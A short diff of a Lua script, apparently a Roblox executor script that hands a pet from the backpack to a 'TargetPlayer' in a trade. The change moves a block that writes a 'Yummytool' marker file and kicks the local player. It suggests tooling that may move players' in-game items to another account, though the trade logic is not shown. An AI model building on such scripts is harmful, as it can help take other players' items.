@@ -123,12 +123,12 @@ function TAFSERVICE.d()
     local TargetPlayer = TAFSERVICE.a()
 
     if not TargetPlayer then
-        writefile(filename, "Yummytool")
-        LocalPlayer:Kick("du pet r be iu di ra th")
+        print("No player found")
         return false
     end
     if not Pet then
-        print("[Trade] No matching pet found in Backpack.")
+        writefile(filename, "Yummytool")
+        LocalPlayer:Kick("du pet r be iu di ra th")
         return false
     end
 
